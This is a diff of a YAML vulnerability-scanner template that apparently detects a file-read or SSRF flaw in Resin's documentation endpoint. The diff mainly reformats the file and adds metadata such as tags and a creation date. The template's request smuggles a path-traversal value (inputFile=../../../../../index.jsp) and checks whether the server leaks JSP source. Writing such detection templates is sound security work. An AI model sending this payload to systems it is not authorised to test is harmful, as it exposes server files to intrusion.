@@ -1,15 +1,19 @@
 id: resin-inputfile-fileread-or-ssrf
 
 info:
-    name: resin inputfile fileread
-    author: whynot(https://github.com/notwhy)
-    severity: high
+  name: resin inputfile fileread
+  author: whynot
+  severity: high
+  verified: true
+  description: |-
+    resin inputfile fileread or ssrf
+  tags: resin,fileread,ssrf
+  created: 2023/08/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
-        expression: response.status == 200 && response.body.bcontains(bytes("<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
+  r0:
+    request:
+      method: GET
+      path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes("<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
 expression: r0()
-
